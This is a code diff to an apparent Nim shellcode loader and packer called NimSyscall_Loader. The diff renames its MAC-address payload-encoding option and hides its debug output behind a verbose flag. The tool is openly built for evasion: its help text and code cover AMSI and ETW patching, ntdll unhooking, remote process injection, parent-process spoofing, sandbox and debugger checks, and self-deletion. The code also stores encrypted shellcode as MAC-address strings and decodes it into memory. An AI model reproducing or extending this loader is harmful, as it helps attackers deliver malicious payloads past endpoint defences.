@@ -65,7 +65,7 @@ let helpmenu = """
 NimSyscall_Loader v 1.9
 
 Usage:
-  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --remoteMapSection --unhook --reflective --obfuscate --macShellcode --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --sourceonly]
+  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --remoteMapSection --unhook --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --sourceonly]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -122,7 +122,7 @@ Options:
   --COMVARETW    Block ETW by setting COMPlus_ETWEnabled to 0
   --unhook    Unhook ntdll.dll before doing anything else for the current process
   --obfuscate    Compile the Nim binary via Denim to make use of LLVM obfuscation
-  --macShellcode    Convert the encrypted Shellcode to MAC-Adresses to reduce entropy (for embedded Payloads only)
+  --macPayload    Convert the encrypted Shellcode to MAC-Adresses to reduce entropy (for embedded Payloads only)
   --sgn    Encode shellcode via SGN before encrypting it´
   --replace    Replace common nim IoC's in the loader like the string 'nim'
   --noOneShot    By default the Packer uses Hardware Breakpoints to bypass AMSI, but disables it after the payload has been executed. If you want to keep it enabled for the current Thread, use this option.
@@ -276,7 +276,7 @@ var
     remoteAMSIpatch: bool = false
     remoteETWpatch: bool = false
     replace: bool = false
-    macShellcodeString: string
+    macPayloadString: string
     pump: bool = false
     pumpfmt: string = ""
     pumpargs: seq[string]
@@ -291,7 +291,7 @@ var
     noDInvoke: bool = false
     metadata: bool = false
     antidebug: bool = true
-    macShellcode: bool = false
+    macPayload: bool = false
     defaultSandBoxChecks: bool = true
     remoteMapSection: bool = false
     remoteinject: bool = false
@@ -516,8 +516,8 @@ if args["--reflective"]:
 if args["--obfuscate"]:
   denim = true
 
-if args["--macShellcode"]:
-  macShellcode = true
+if args["--macPayload"]:
+  macPayload = true
 
 if args["--sign"]:
     sign = true
@@ -818,14 +818,14 @@ echo "Writing encrypted blob to disk: "
 var content: string = cast[string](enctext)
 writeFile(shellcodeFile[0], content)
 
-if(macShellcode):
+if(macPayload):
     echo "[*] Converting Shellcode to MAC-Adresses: "
     echo fmt"{packerPath}\bin2mac\bin2mac.exe {packerPath}\{shellcodeFile[0]}"
     when system.hostOS == "linux":
-        macShellcodeString = exec_cmd_ex(fmt"{packerPath}/bin2mac/bin2mac.py {packerPath}/{shellcodeFile[0]}")[0]
+        macPayloadString = exec_cmd_ex(fmt"{packerPath}/bin2mac/bin2mac.py {packerPath}/{shellcodeFile[0]}")[0]
     when system.hostOS == "windows":
-        macShellcodeString = exec_cmd_ex(fmt"{packerPath}\bin2mac\bin2mac.exe {packerPath}\{shellcodeFile[0]}")[0]
-    #echo macShellcodeString
+        macPayloadString = exec_cmd_ex(fmt"{packerPath}\bin2mac\bin2mac.exe {packerPath}\{shellcodeFile[0]}")[0]
+    #echo macPayloadString
 
 
 if(AMSICreateSectionHook):
@@ -1521,16 +1521,16 @@ proc lstrlenW*(lpString: PWCHAR): int =
         inc(i)
     return i
 
-when defined(macShellcode):
+when defined(macPayload):
     proc RtlEthernetStringToAddressA*(str: PCSTR, terminator: ptr PCSTR, targetaddr: DWORD_PTR): NTSTATUS {.importc, dynlib: "ntdll.dll".}
 
 
 """
 
-let macShellcodeStub = fmt"""
+let macPayloadStub = fmt"""
 
 
-{macShellcodeString}
+{macPayloadString}
 
 var rowLen: int = len(mac)
 var Terminator: PCSTR
@@ -1547,14 +1547,16 @@ else:
 
 var directPointer: LPVOID = cast[LPVOID](alloc_mem)
 
+when defined(verbose):
+    echo obf("[*] MAC addresses to memory data conversion...")
+
 for i in 0 ..< rowLen:
-    echo "RTLString: ", mac[i]
-    STATUS = RtlEthernetStringToAddressA(mac[i], &Terminator, directPointer)
+    STATUS = RtlEthernetStringToAddressA(mac[i], &Terminator, cast[DWORD_PTR](directPointer))
     if STATUS == STATUS_SUCCESS:
-        echo "SUCCESS"
         directPointer += 6
     else:
-        echo "Failed with Error Code: ", toHex(STATUS)
+        when defined(verbose):
+            echo obf("Failed with Error Code: "), toHex(STATUS)
 
 """
 
@@ -1572,16 +1574,18 @@ else:
 var ptrEncText: ptr byte
 var ptrDecText: ptr byte
 when defined(PayloadEmbedded):
-    when defined(macShellcode):
+    when defined(macPayload):
         var enctext = newSeq[byte](len(mac)*(6))
         var dectext = newSeq[byte](len(mac)*(6))
         if ((len(enctext) mod aes256.sizeBlock) != 0):
-            echo obf("[*] Payload length not a multiple of the BlockSize: "), aes256.sizeBlock
-            echo obf("[*] Length: ") & $len(enctext)
-            echo obf("[*] Padding payload...")
+            when defined(verbose):
+                echo obf("[*] Payload length not a multiple of the BlockSize: "), aes256.sizeBlock
+                echo obf("[*] Length: ") & $len(enctext)
+                echo obf("[*] Padding payload...")
             enctext = enctext & newSeq[byte](aes256.sizeBlock - (len(enctext) mod aes256.sizeBlock))
             dectext = dectext & newSeq[byte](aes256.sizeBlock - (len(dectext) mod aes256.sizeBlock))
-            echo obf("[*] New Length: ") & $len(enctext)
+            when defined(verbose):
+                echo obf("[*] New Length: ") & $len(enctext)
         # Move the encrypted Shellcode into the enctext sequence
         moveMem(addr enctext[0], alloc_mem, len(enctext))
     else:
@@ -2123,8 +2127,8 @@ else:
 """
 
 var stub = Cryptstub1
-if(macShellcode):
-    stub.add(macShellcodeStub)
+if(macPayload):
+    stub.add(macPayloadStub)
 stub.add(Cryptstub15)
 
 if (not noDInvoke):
@@ -2547,8 +2551,8 @@ else:
 if(antidebug):
     basicCompileFlags.add("-d:AntiDebug ")
 
-if(macShellcode):
-    basicCompileFlags.add("-d:macShellcode ")
+if(macPayload):
+    basicCompileFlags.add("-d:macPayload ")
 
 if(unhook):
     basicCompileFlags.add("-d:unhook ")
